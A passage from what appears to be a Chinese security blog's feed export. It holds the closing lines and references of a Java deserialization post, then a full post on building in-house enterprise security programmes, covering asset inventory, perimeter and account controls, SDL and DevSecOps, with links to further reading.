F02;&#x5E38;&#xFF0C;&#x800C;&#x662F;return&#x4E86;</p>
</blockquote>
<p>&#x540E;&#x7EED; JRE8u20 &#x5BF9;&#x6B64;&#x8FDB;&#x884C;&#x4E86;&#x7ED5;&#x8FC7;&#xFF0C;&#x901A;&#x8FC7;&#x6784;&#x9020;&#x7578;&#x578B;&#x5E8F;&#x5217;&#x5316;&#x6570;&#x636E;&#xFF0C;&#x4F7F;&#x5F97;&#x9488;&#x5BF9; <code>AnnotationInvocationHandler.type</code> &#x7684;&#x68C0;&#x67E5;&#x88AB;&#x547D;&#x4E2D;&#x65F6;&#x6240;&#x629B;&#x51FA;&#x7684;&#x5F02;&#x5E38;&#x88AB; <code>BeanContextSupport.readChildren()</code> &#x4E2D;&#x7684; <code>try/catch</code> &#x5757;&#x6355;&#x83B7;&#x5E76; continue&#xFF0C;&#x4F46;&#x6784;&#x9020;&#x8FC7;&#x4E8E;&#x590D;&#x6742;&#xFF0C;&#x4E14;&#x6CA1;&#x6709;&#x65B0;&#x7684; gadget&#xFF0C;&#x56E0;&#x6B64;&#x4E0D;&#x5728;&#x672C;&#x6587;&#x63A2;&#x8BA8;&#x8303;&#x56F4;&#x5185;</p>
<h1 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h1><p><a href="https://xz.aliyun.com/t/3847" target="_blank" rel="noopener">https://xz.aliyun.com/t/3847</a></p>
<p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p>
<p><a href="http://scz.617.cn/" target="_blank" rel="noopener">http://scz.617.cn/</a></p>
</body></html>]]></content>
      <categories>
        <category>Java Sec</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>甲方安全建设的思路学习和思考</title>
    <url>/2021/01/20/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E7%9A%84%E6%80%9D%E8%B7%AF%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%80%9D%E8%80%83/</url>
    <content><![CDATA[<html><head></head><body><p>&#x5BF9;&#x7532;&#x65B9;&#x5B89;&#x5168;&#x5EFA;&#x8BBE;&#x7684;&#x77E5;&#x8BC6;&#x5B66;&#x4E60;&#x4EE5;&#x53CA;&#x5BF9;&#x672A;&#x6765;&#x804C;&#x4E1A;&#x89C4;&#x5212;&#x7684;&#x601D;&#x8003;</p>
<a id="more"></a>

<h1 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h1><p>&#x6700;&#x8FD1;&#x4E00;&#x6B21;&#x5076;&#x7136;&#x7684;&#x9762;&#x8BD5;&#x88AB;&#x95EE;&#x5230;&#x4E86;&#x7532;&#x65B9;&#x5B89;&#x5168;&#xFF0C;&#x548C;&#x9762;&#x8BD5;&#x5B98;&#x4EA4;&#x6D41;&#x5B66;&#x5230;&#x4E86;&#x5F88;&#x591A;&#x601D;&#x7EF4;&#x4E0A;&#x9762;&#x7684;&#x4E1C;&#x897F;&#x3002;</p>
<p>&#x9762;&#x5BF9;&#x8FD9;&#x4ECE;&#x672A;&#x6D89;&#x8DB3;&#x8FC7;&#x7684;&#x65B9;&#x9762;&#xFF0C;&#x6211;&#x5E0C;&#x671B;&#x80FD;&#x5148;&#x4ECE;&#x4E92;&#x8054;&#x7F51;&#x4E0A;&#x7684;&#x6587;&#x7AE0;&#x501F;&#x9274;&#x4E00;&#x4E9B;&#x4F53;&#x7CFB;&#x5316;&#x6D41;&#x7A0B;&#x5EFA;&#x8BBE;&#x7684;&#x601D;&#x8DEF;&#xFF0C;&#x5B66;&#x4E60;&#x4E00;&#x4E9B;&#x65B9;&#x6CD5;&#x8BBA;</p>
<p>&#x5F53;&#x7136;&#x5728;&#x5B66;&#x4E60;&#x7532;&#x65B9;&#x5B89;&#x5168;&#x5EFA;&#x8BBE;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x6211;&#x7ECF;&#x5E38;&#x4F1A;&#x5F15;&#x53D1;&#x4E00;&#x4E9B;&#x5BF9;&#x672A;&#x6765;&#x7684;&#x601D;&#x8003;</p>
<p>&#x4EE5;&#x4E0B;&#x51E0;&#x7BC7;&#x6587;&#x7AE0;&#x7ED9;&#x6211;&#x5E26;&#x6765;&#x7684;&#x89E6;&#x52A8;&#x9887;&#x591A;&#xFF1A;</p>
<ul>
<li>&#x5728;&#x817E;&#x8BAF;&#x7684;&#x516B;&#x5E74;&#xFF0C;&#x6211;&#x7684;&#x804C;&#x4E1A;&#x601D;&#x8003;&#xFF1A;<a href="https://yuguo.us/weblog/tencent-8-years/" target="_blank" rel="noopener">https://yuguo.us/weblog/tencent-8-years/</a></li>
<li>&#x5B89;&#x5168;&#x4ECE;&#x4E1A;&#x4EBA;&#x5458;&#x7684;&#x804C;&#x4E1A;&#x89C4;&#x5212;&#xFF1A;<a href="https://mp.weixin.qq.com/s/134C13nbVtJkg-MM0eRe8g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/134C13nbVtJkg-MM0eRe8g</a></li>
</ul>
<p>&#x5176;&#x4E2D;&#x4E00;&#x5F20;&#x56FE;&#x66F4;&#x662F;&#x5F15;&#x53D1;&#x4E86;&#x6211;&#x5E73;&#x6DE1;&#x7684;&#x5B66;&#x4E60;&#x751F;&#x6D3B;&#x4E2D;&#x5BF9;&#x672A;&#x6765;&#x89C4;&#x5212;&#x7684;&#x4E00;&#x4E2A;&#x601D;&#x8003;</p>
<p><img src="/2021/01/20/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E7%9A%84%E6%80%9D%E8%B7%AF%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%80%9D%E8%80%83/image-20210120140012089.png" alt></p>
<p>&#x6B64;&#x5916;&#xFF0C;&#x548C;&#x9762;&#x8BD5;&#x5B98;&#x804A;&#x4E86;&#x4E00;&#x4E9B;&#x5173;&#x4E8E;&#x7532;&#x4E59;&#x65B9;&#x5BF9;&#x5B89;&#x5168;&#x7684;&#x770B;&#x6CD5;&#x7B49;&#x7B49;&#xFF0C;&#x6211;&#x60ED;&#x6127;&#x7684;&#x53D1;&#x73B0;&#x81EA;&#x5DF1;&#x4E00;&#x76F4;&#x5FFD;&#x7565;&#x4E86;&#x6F0F;&#x6D1E;&#x7684;&#x9632;&#x6B62;&#x548C;&#x4FEE;&#x590D;&#x8FD9;&#x4E00;&#x4E2A;&#x5173;&#x952E;&#x7684;&#x70B9;&#x4E0A;&#x3002;&#x6BCF;&#x6B21;&#x90FD;&#x53EA;&#x77E5;&#x9053;&#x4E2A;&#x5927;&#x6982;&#xFF0C;&#x800C;&#x771F;&#x6B63;&#x7684;&#x4E1A;&#x52A1;&#x4E0A;&#x7684;&#x4FEE;&#x590D;&#x5374;&#x4E0D;&#x77E5;&#x9053;&#x5982;&#x4F55;&#x7740;&#x624B;&#x3002;&#x6211;&#x51B3;&#x5B9A;&#x4ECE;&#x73B0;&#x5728;&#x5F00;&#x59CB;&#x6539;&#x6389;&#x8FD9;&#x4E2A;&#x574F;&#x4E60;&#x60EF;&#x3002;</p>
<h1 id="&#x5B89;&#x5168;&#x5EFA;&#x8BBE;&#x6B65;&#x9AA4;"><a href="#&#x5B89;&#x5168;&#x5EFA;&#x8BBE;&#x6B65;&#x9AA4;" class="headerlink" title="&#x5B89;&#x5168;&#x5EFA;&#x8BBE;&#x6B65;&#x9AA4;"></a>&#x5B89;&#x5168;&#x5EFA;&#x8BBE;&#x6B65;&#x9AA4;</h1><p>&#x4E0B;&#x6587;&#x6B65;&#x9AA4;&#x8F6C;&#x81EA; @pirogue &#x5E08;&#x5085;&#x6587;&#x7AE0;&#xFF1A;<a href="http://pirogue.org/2017/06/17/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E6%AD%A5%E9%AA%A4/" target="_blank" rel="noopener">&#x7532;&#x65B9;&#x5B89;&#x5168;&#x5EFA;&#x8BBE;&#x6B65;&#x9AA4;</a></p>
<ol>
<li><strong>&#x8D44;&#x4EA7;&#x68B3;&#x7406;</strong><ul>
<li>IP&#x5217;&#x8868;&#x3001;&#x4E1A;&#x52A1;&#x5206;&#x7EC4;(&#x8D1F;&#x8D23;&#x4EBA;&#x3001;&#x8054;&#x7CFB;&#x65B9;&#x5411;)&#x3001;&#x4E1A;&#x52A1;&#x5C5E;&#x6027;</li>
<li>&#x4E1A;&#x52A1;&#x7AEF;&#x53E3;</li>
<li>&#x4E1A;&#x52A1;&#x5E94;&#x7528;&#x67B6;&#x6784;&#x3001;&#x6280;&#x672F;&#x5806;&#x6808;</li>
</ul>
</li>
</ol>
<ol start="2">
<li><strong>&#x8FB9;&#x754C;&#x5B89;&#x5168;&#xFF0C;&#x9632;&#x706B;&#x5899;&#x7B56;&#x7565;&#x63A7;&#x5236;&#xFF08;&#x9700;&#x8981;&#x68B3;&#x7406;&#x4E1A;&#x52A1;&#x7AEF;&#x53E3;&#xFF09;</strong><ul>
<li>&#x5982;&#x679C;&#x662F;&#x786C;&#x4EF6;&#xFF0C;&#x4F7F;&#x7528;&#x9632;&#x706B;&#x5899;&#x7EDF;&#x4E00;&#x63A7;&#x5236;</li>
<li>&#x5982;&#x679C;&#x662F;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#xFF0C;Iptalbes&#xFF0B;IPSEC</li>
<li>&#x53CA;&#x65F6;&#x76D1;&#x63A7;&#x4E1A;&#x52A1;&#x7AEF;&#x53E3;&#x7684;&#x53D8;&#x5316;&#xFF08;&#x5916;&#x90E8;nmap&#x626B;&#x63CF;&#x641C;&#x96C6;&#x7ED3;&#x679C;&#x6BD4;&#x5BF9;&#xFF0C;&#x6216;&#x8005;&#x7F16;&#x5199;&#x811A;&#x6B65;&#x653E;&#x5230;&#x8FD0;&#x7EF4;&#x5E73;&#x53F0;&#x6536;&#x96C6;&#x7CFB;&#x7EDF;&#x76D1;&#x542C;&#x7AEF;&#x53E3;&#x548C;&#x9632;&#x706B;&#x5899;&#x7B56;&#x7565;)</li>
<li>&#x8DF3;&#x677F;&#x673A;&#x5B89;&#x5168;&#x63A7;&#x5236;</li>
</ul>
</li>
</ol>
<ol start="3">
<li><strong>&#x8D26;&#x6237;&#x5B89;&#x5168;&#x7BA1;&#x7406;</strong><ul>
<li>&#x5F31;&#x5BC6;&#x7801;</li>
<li>root&#x3001;sudoer&#x6743;&#x9650;</li>
<li>&#x8D26;&#x6237;&#x3001;&#x6388;&#x6743;&#x3001;&#x8BBF;&#x95EE;&#x3001;&#x5BA1;&#x8BA1;&#x7B49;&#x7B49;</li>
</ul>
</li>
</ol>
<ol start="4">
<li><strong>&#x670D;&#x52A1;&#x5668;&#x5B89;&#x5168;</strong><ul>
<li>&#x5B89;&#x5168;&#x57FA;&#x7EBF;&#x68C0;&#x6D4B;</li>
<li>&#x64CD;&#x4F5C;&#x5BA1;&#x8BA1;</li>
<li>&#x5F02;&#x5E38;&#x767B;&#x5F55;&#x5BA1;&#x8BA1;(&#x65E5;&#x5FD7;&#x6536;&#x96C6;&#x5206;&#x6790;)</li>
<li>&#x6F0F;&#x6D1E;&#x6E05;&#x70B9;/&#x626B;&#x63CF;&#xFF0C;&#x8865;&#x4E01;&#x4FEE;&#x590D;&#x6D4B;&#x8BD5;&#x548C;&#x63A8;&#x8FDB;</li>
</ul>
</li>
</ol>
<ol start="5">
<li><strong>WEB&#x5B89;&#x5168;</strong><ul>
<li>&#x5E94;&#x7528;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;</li>
<li>&#x63A5;&#x53E3;&#x5B89;&#x5168;(&#x52A0;&#x5BC6;&#x3001;&#x901A;&#x4FE1;)</li>
<li>webshell&#x5B9E;&#x65F6;&#x76D1;&#x6D4B;</li>
<li>Nginx&#x65E5;&#x5FD7;&#x5206;&#x6790;/Nginx&#x6D41;&#x91CF;&#x65C1;&#x8DEF;&#x5206;&#x6790;</li>
</ul>
</li>
</ol>
<ol start="6">
<li><strong>&#x4E1A;&#x52A1;&#x98CE;&#x63A7;&#x5B89;&#x5168;</strong><ul>
<li>&#x7528;&#x6237;&#x5B89;&#x5168;&#x673A;&#x5236;&#xFF08;&#x5BC6;&#x7801;&#x3001;&#x9A8C;&#x8BC1;&#x7801;&#x3001;&#x767B;&#x5F55;&#xFF09;</li>
<li>&#x4EA4;&#x6613;&#x5B89;&#x5168;</li>
</ul>
</li>
</ol>
<ol start="7">
<li><strong>&#x5B89;&#x5168;&#x57F9;&#x8BAD;</strong><ul>
<li>&#x5B89;&#x5168;&#x610F;&#x8BC6;&#x57F9;&#x8BAD;</li>
<li>&#x8FD0;&#x7EF4;&#x5B89;&#x5168;&#x57F9;&#x8BAD;</li>
<li>WEB&#x5B89;&#x5168;&#x5F00;&#x53D1;</li>
</ul>
</li>
</ol>
<ol start="8">
<li><strong>&#x5B89;&#x5168;&#x89C4;&#x8303;&#x548C;&#x6D41;&#x7A0B;</strong><ul>
<li>&#x4EBA;&#x5458;&#x5165;&#x804C;&#x8D26;&#x6237;&#x5F00;&#x901A;</li>
<li>&#x4EBA;&#x5458;&#x79BB;&#x804C;&#x8D26;&#x6237;&#x6CE8;&#x9500;</li>
<li>&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x4E0B;&#x67B6;&#x5B89;&#x5168;&#x7BA1;&#x7406;</li>
<li>&#x5B89;&#x5168;&#x5E94;&#x6025;&#x54CD;&#x5E94;&#x673A;&#x5236;</li>
</ul>
</li>
</ol>
<ol start="9">
<li><strong>&#x5185;&#x7F51;&#x5B89;&#x5168;</strong><ul>
<li>&#x5185;&#x7F51;&#x670D;&#x52A1;&#x5668;&#x5B89;&#x5168;</li>
<li>&#x8D26;&#x6237;&#x7EDF;&#x4E00;&#x9A8C;&#x8BC1;&#x548C;&#x7BA1;&#x7406;&#x673A;&#x5236;(&#x57DF;ldap&#x534F;&#x8BAE;&#x7EDF;&#x4E00;&#x9A8C;&#x8BC1;OA&#x3001;RTX&#x3001;&#x90AE;&#x4EF6;&#x3001;&#x5185;&#x7F51;&#x4E1A;&#x52A1;&#x7CFB;&#x7EDF;)</li>
<li>&#x5F31;&#x53E3;&#x4EE4;&#x76D1;&#x6D4B;(NTLM/LM)</li>
<li>&#x8D26;&#x6237;&#x5F02;&#x5E38;&#x767B;&#x5F55;</li>
<li>&#x7F51;&#x7EDC;&#x9694;&#x79BB;&#xFF08;&#x7269;&#x7406;&#xFF0F;&#x865A;&#x62DF;&#x5316;&#xFF09;</li>
<li>&#x7F51;&#x7EDC;&#x51C6;&#x5165;</li>
<li>PC&#x5B89;&#x5168;&#xFF08;&#x75C5;&#x6BD2;&#x7EDF;&#x4E00;&#x7BA1;&#x7406;&#x3001;&#x901A;&#x77E5;&#x5904;&#x7406;&#xFF09;</li>
</ul>
</li>
</ol>
<p>&#x5173;&#x4E8E;&#x4E00;&#x4E9B;&#x601D;&#x8DEF;&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#x4ECE;&#x591A;&#x4E2A;&#x7EF4;&#x5EA6;&#x8BB2;&#x89E3;&#x4E86;&#x5B89;&#x5168;&#x5EFA;&#x8BBE;&#x7684;&#x601D;&#x8003;&#xFF0C;&#x4E2A;&#x4EBA;&#x611F;&#x89C9;&#x5199;&#x7684;&#x975E;&#x5E38;&#x4E0D;&#x9519;&#xFF1A;<a href="https://www.secrss.com/articles/26532" target="_blank" rel="noopener">https://www.secrss.com/articles/26532</a></p>
<blockquote>
<p><strong>&#x4E00;&#x3001;&#x5B89;&#x5168;&#x4E0E;&#x4E1A;&#x52A1;&#x7684;&#x5173;&#x7CFB;</strong></p>
<p><strong>&#x4E8C;&#x3001;&#x4E92;&#x8054;&#x7F51;&#x4F01;&#x4E1A;&#x5B89;&#x5168;&#x5EFA;&#x8BBE;&#x6574;&#x4F53;&#x601D;&#x8DEF;</strong></p>
<p><strong>&#x4E09;&#x3001;&#x4E92;&#x8054;&#x7F51;&#x4F01;&#x4E1A;&#x9762;&#x4E34;&#x5B89;&#x5168;&#x98CE;&#x9669;&#x4E0E;&#x5F71;&#x54CD;</strong></p>
<p><strong>&#x56DB;&#x3001;&#x4E92;&#x8054;&#x7F51;&#x4F01;&#x4E1A;&#x6838;&#x5FC3;&#x5B89;&#x5168;&#x76EE;&#x6807;</strong></p>
<p><strong>&#x4E94;&#x3001;&#x4E92;&#x8054;&#x7F51;&#x4F01;&#x4E1A;&#x6838;&#x5FC3;&#x5B89;&#x5168;&#x80FD;&#x529B;&#x5EFA;&#x8BBE;</strong></p>
<p><strong>&#x516D;&#x3001;&#x4E92;&#x8054;&#x7F51;&#x4F01;&#x4E1A;&#x5B89;&#x5168;&#x84DD;&#x56FE;</strong></p>
<p><strong>&#x4E03;&#x3001;&#x4E92;&#x8054;&#x7F51;&#x4F01;&#x4E1A;&#x5B89;&#x5168;&#x6574;&#x4F53;&#x89C6;&#x89D2;</strong></p>
<p><strong>&#x516B;&#x3001;&#x5982;&#x4F55;&#x843D;&#x5730;&#x5B9E;&#x65BD;</strong></p>
<p><strong>&#x4E5D;&#x3001;&#x5206;&#x9636;&#x6BB5;&#x5B89;&#x5168;&#x4F53;&#x7CFB;&#x5EFA;&#x8BBE;</strong></p>
<p><strong>&#x5341;&#x3001;&#x505A;&#x597D;&#x5B89;&#x5168;&#x5EFA;&#x8BBE;&#x7684;&#x5FC5;&#x8981;&#x6761;&#x4EF6;</strong></p>
<p><strong>&#x5341;&#x4E00;&#x3001;&#x5982;&#x4F55;&#x8861;&#x91CF;&#x5B89;&#x5168;&#x5EFA;&#x8BBE;&#x7684;&#x6548;&#x679C;</strong></p>
<p><strong>&#x5341;&#x4E8C;&#x3001;&#x5B89;&#x5168;&#x6F0F;&#x6D1E;&#x7BA1;&#x7406;&#x5E73;&#x53F0;&#x5EFA;&#x8BBE;&#x5B9E;&#x8DF5;</strong></p>
<p><strong>&#x5341;&#x4E09;&#x3001;&#x5199;&#x5728;&#x6700;&#x540E;</strong></p>
</blockquote>
<p>&#x53E6;&#x4E00;&#x7BC7;&#x7740;&#x91CD;&#x8C08;&#x4F53;&#x7CFB;&#x5316;&#x601D;&#x8003;&#x7684;&#x6587;&#x7AE0;&#x4E5F;&#x975E;&#x5E38;&#x4E0D;&#x9519;&#xFF1A;&#x4F01;&#x4E1A;&#x5B89;&#x5168;&#x5EFA;&#x8BBE;&#x7684;&#x4F53;&#x7CFB;&#x601D;&#x8003;&#x4E0E;&#x843D;&#x5730;&#x5B9E;&#x8DF5;&#xFF1A; <a href="https://www.secrss.com/articles/11299" target="_blank" rel="noopener">https://www.secrss.com/articles/11299</a></p>
<p>&#x5173;&#x952E;&#x70B9;&#x5C31;&#x662F;&#x5BF9;&#x77E5;&#x8BC6;&#x7684;&#x5B66;&#x4E60;&#x3001;&#x63D0;&#x70BC;&#x3001;&#x603B;&#x7ED3;&#x3001;&#x5206;&#x7C7B;&#xFF0C;&#x7136;&#x540E;&#x6839;&#x636E;&#x5F53;&#x524D;&#x73AF;&#x5883;&#x5206;&#x6790;&#xFF0C;&#x6700;&#x540E;&#x89E3;&#x51B3;&#x95EE;&#x9898;</p>
<h1 id="SDL"><a href="#SDL" class="headerlink" title="SDL"></a>SDL</h1><p>&#x5FAE;&#x8F6F;&#x5B89;&#x5168;&#x5F00;&#x53D1;&#x751F;&#x547D;&#x5468;&#x671F;&#xFF08;Security Development Lifecycle&#xFF09;&#x7B80;&#x79F0; SDL</p>
<p>SDL &#x8FC7;&#x7A0B;&#x56FE;</p>
<p><img src="/2021/01/20/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E7%9A%84%E6%80%9D%E8%B7%AF%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%80%9D%E8%80%83/894761-20181114190434432-871897550.png" alt></p>
<p>&#x66F4;&#x591A;&#x53C2;&#x770B;&#xFF1A;</p>
<blockquote>
<p>[1]&#x3010;&#x8F6F;&#x4EF6;&#x5B89;&#x5168;&#x8BBE;&#x8BA1;&#x3011;&#x5B89;&#x5168;&#x5F00;&#x53D1;&#x751F;&#x547D;&#x5468;&#x671F;&#xFF08;SDL&#xFF09; <a href="http://blog.nsfocus.net/sdl/" target="_blank" rel="noopener">http://blog.nsfocus.net/sdl/</a><br>[2] &#x5FAE;&#x8F6F;SDL&#x5B98;&#x65B9;&#x5730;&#x5740;<br><a href="http://www.microsoft.com/security/sdl/default.aspx" target="_blank" rel="noopener">http://www.microsoft.com/security/sdl/default.aspx</a><br>[3] Microsoft SDL &#x7684;&#x7B80;&#x5316;&#x5B9E;&#x65BD;<br><a href="https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=12379" target="_blank" rel="noopener">https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=12379</a><br>[4] SDL &#x5A01;&#x80C1;&#x5EFA;&#x6A21;&#x5DE5;&#x5177;&#x5165;&#x95E8;<br><a href="https://msdn.microsoft.com/zh-cn/magazine/dd347831.aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/zh-cn/magazine/dd347831.aspx</a></p>
</blockquote>
<p>&#x6B64;&#x5916;&#x8FD9;&#x7BC7;&#x6587;&#x7AE0; <a href="https://xz.aliyun.com/t/6625" target="_blank" rel="noopener">https://xz.aliyun.com/t/6625</a> &#x5728;&#x4ECB;&#x7ECD; SDL &#x7684;&#x65F6;&#x5019;&#x82B1;&#x4E86;&#x5F88;&#x5927;&#x7684;&#x7BC7;&#x5E45;&#x5728;&#x8BB2; SonarQube &#x76F8;&#x5173;&#x7684;&#x5B89;&#x88C5;&#x548C;&#x914D;&#x7F6E;&#xFF0C;&#x6CA1;&#x6709;&#x63A5;&#x89E6;&#x8FC7; SonarQube &#x3002;&#x5148;&#x7559;&#x4E2A;&#x5751;&#x3002;</p>
<h1 id="DevSecOps"><a href="#DevSecOps" class="headerlink" title="DevSecOps"></a>DevSecOps</h1><p>&#x6839;&#x636E;&#x7F51;&#x4E0A;&#x5927;&#x591A;&#x6570;&#x6587;&#x7AE0;&#xFF0C;&#x6211;&#x53D1;&#x73B0;&#x73B0;&#x5728;&#x5F88;&#x591A;&#x5927;&#x4F01;&#x4E1A;&#x90FD;&#x5728;&#x63A8;&#x8FDB; DevSecOps</p>
<blockquote>
<p>SDL&#x4E0E;DevSecOps&#x6709;&#x5404;&#x81EA;&#x7684;&#x9002;&#x7528;&#x573A;&#x666F;&#xFF0C;&#x5BF9;&#x8F6F;&#x4EF6;&#x5B89;&#x5168;&#x5F00;&#x53D1;&#x7684;&#x53D1;&#x5C55;&#x90FD;&#x6709;&#x7740;&#x91CD;&#x8981;&#x7684;&#x8D21;&#x732E;&#x3002;</p>
<p>DevSecOps&#x8D8A;&#x6765;&#x8D8A;&#x53D7;&#x5230;&#x5468;&#x671F;&#x77ED;&#x3001;&#x8FED;&#x4EE3;&#x5FEB;&#x7684;&#x4E92;&#x8054;&#x7F51;&#x4E1A;&#x52A1;&#x7684;&#x6B22;&#x8FCE;&#xFF0C;&#x4E5F;&#x6210;&#x4E3A;&#x5B89;&#x5168;&#x754C;&#x7684;&#x6D41;&#x884C;&#x8D8B;&#x52BF;</p>
</blockquote>
<p>&#x4EC0;&#x4E48;&#x662F; DevSecOps &#xFF1F;&#xFF1F;</p>
<blockquote>
<p>DevSecOps&#x4E00;&#x8BCD;&#x6700;&#x65E9;&#x7531;Gartner&#x5728;2012&#x5E74;&#x63D0;&#x51FA;&#xFF0C;&#x5E76;&#x4ECE;2017&#x5E74;&#x5F00;&#x59CB;&#x9010;&#x6E10;&#x6210;&#x4E3A;&#x70ED;&#x95E8;&#x8BCD;&#x6C47;&#x3002;DevSecOps&#x53EF;&#x4EE5;&#x7406;&#x89E3;&#x4E3A;&#x5C06;&#x5B89;&#x5168;&#x6027;&#x878D;&#x5165;&#x5230;DevOps&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x5728;&#x6574;&#x4E2A;&#x5F00;&#x53D1;&#x548C;&#x8FD0;&#x7EF4;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x5C06;&#x5B89;&#x5168;&#x4F5C;&#x4E3A;&#x4E00;&#x9879;&#x91CD;&#x8981;&#x7684;&#x8003;&#x8651;&#x56E0;&#x7D20;&#xFF0C;&#x6700;&#x7EC8;&#x5B9E;&#x73B0;&#x5E94;&#x7528;&#x6574;&#x4E2A;&#x751F;&#x547D;&#x5468;&#x671F;&#x5185;&#x7684;&#x5B89;&#x5168;&#x6027;&#x3002;&#x5229;&#x7528;DevSecOps&#x5B9E;&#x73B0;&#x5B89;&#x5168;&#x81EA;&#x52A8;&#x5316;&#x53EF;&#x4EE5;&#x5728;&#x63D0;&#x9AD8;&#x7814;&#x53D1;&#x8FD0;&#x7EF4;&#x6548;&#x7387;&#x7684;&#x540C;&#x65F6;&#x589E;&#x5F3A;&#x5E94;&#x7528;&#x7684;&#x5B89;&#x5168;&#x6027;&#x3002;</p>
</blockquote>
<p>&#x5173;&#x4E8E; SDL &#x548C; DevSecOps &#x7684;&#x5BF9;&#x6BD4;&#x53EF;&#x4EE5;&#x770B;&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#xFF1A;<a href="https://www.secrss.com/articles/28407" target="_blank" rel="noopener">https://www.secrss.com/articles/28407</a></p>
<p><img src="/2021/01/20/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E7%9A%84%E6%80%9D%E8%B7%AF%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%80%9D%E8%80%83/3fc09aa1876b70de17cd094367963ccd.png" alt></p>
<blockquote>
<p>&#x4E1A;&#x5185;&#x9996;&#x6B21;&#x5BF9;&#x8BE5;&#x6A21;&#x578B;&#x53CA;&#x914D;&#x5957;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x8FDB;&#x884C;&#x8BE6;&#x7EC6;&#x7684;&#x5206;&#x6790;&#xFF0C;&#x6838;&#x5FC3;&#x7406;&#x5FF5;&#x4E3A;&#xFF1A;&#x5B89;&#x5168;&#x662F;&#x6574;&#x4E2A;IT&#x56E2;&#x961F;&#xFF08;&#x5305;&#x62EC;&#x5F00;&#x53D1;&#x3001;&#x6D4B;&#x8BD5;&#x3001;&#x8FD0;&#x7EF4;&#x53CA;&#x5B89;&#x5168;&#x56E2;&#x961F;&#xFF09;&#x6240;&#x6709;&#x6210;&#x5458;&#x7684;&#x8D23;&#x4EFB;&#xFF0C;&#x9700;&#x8981;&#x8D2F;&#x7A7F;&#x6574;&#x4E2A;&#x4E1A;&#x52A1;&#x751F;&#x547D;&#x5468;&#x671F;&#x7684;&#x6BCF;&#x4E00;&#x4E2A;&#x73AF;&#x8282;&#x3002;&#x6BCF;&#x4E2A;&#x4EBA;&#x90FD;&#x5BF9;&#x5B89;&#x5168;&#x8D1F;&#x8D23;&#xFF0C;&#x5B89;&#x5168;&#x5DE5;&#x4F5C;&#x524D;&#x7F6E;&#xFF0C;&#x67D4;&#x548C;&#x5D4C;&#x5165;&#x73B0;&#x6709;&#x5F00;&#x53D1;&#x6D41;&#x7A0B;&#x4F53;&#x7CFB;&#x3002;</p>
</blockquote>
<p>&#x8BE6;&#x7EC6;&#x4E00;&#x70B9;&#x7684;&#x6211;&#x5F15;&#x5165; <strong>&#x643A;&#x7A0B;DevSecOps&#x5B9E;&#x8DF5;</strong> &#x4E00;&#x6587;&#x7684;&#x56FE;</p>
<p><img src="/2021/01/20/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E7%9A%84%E6%80%9D%E8%B7%AF%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%80%9D%E8%80%83/5996e6fa7526984dd7a7cbb147872d21.png" alt></p>
<p>&#x8FD9;&#x4E00;&#x56FE;&#x5927;&#x6982;&#x7684;&#x80FD;&#x7406;&#x6E05;&#x695A;&#x6BCF;&#x4E00;&#x4E2A;&#x7F13;&#x89E3;&#x7684;&#x4E8B;&#x9879;</p>
<p>&#x66F4;&#x8BE6;&#x7EC6;&#x7684;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x4E91;&#x9F0E;&#x5B9E;&#x9A8C;&#x5BA4;&#x7684;&#x56FE;</p>
<p><img src="/2021/01/20/%E7%94%B2%E6%96%B9%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E7%9A%84%E6%80%9D%E8%B7%AF%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%80%9D%E8%80%83/6eb8ec23aba413fc4075c15c9df193ca.png" alt></p>
<p>&#x4EE5;&#x4E0B;&#x4E09;&#x4E2A;&#x4F8B;&#x5B50;&#x5206;&#x522B;&#x662F;&#x4E0D;&#x540C;&#x4F01;&#x4E1A;&#x5728;&#x5EFA;&#x8BBE; DevSecOps &#x7684;&#x601D;&#x8DEF;&#x5206;&#x4EAB;</p>
<ul>
<li>OPPO&#x4E92;&#x8054;&#x7F51;DevSecOps&#x5B9E;&#x8DF5;&#xFF1A;<a href="https://www.secrss.com/articles/25053" target="_blank" rel="noopener">https://www.secrss.com/articles/25053</a></li>
<li>DevSecOps&#x5728;&#x643A;&#x7A0B;&#x7684;&#x6700;&#x4F73;&#x5B9E;&#x8DF5;&#xFF1A;<a href="https://www.secrss.com/articles/23728" target="_blank" rel="noopener">https://www.secrss.com/articles/23728</a></li>
<li>DevSecOps&#x5728;&#x817E;&#x8BAF;&#x4E91;&#x7684;&#x843D;&#x5730;&#x5B9E;&#x8DF5;&#xFF1A;<a href="https://www.secrss.com/articles/19426" target="_blank" rel="noopener">https://www.secrss.com/articles/19426</a></li>
</ul>
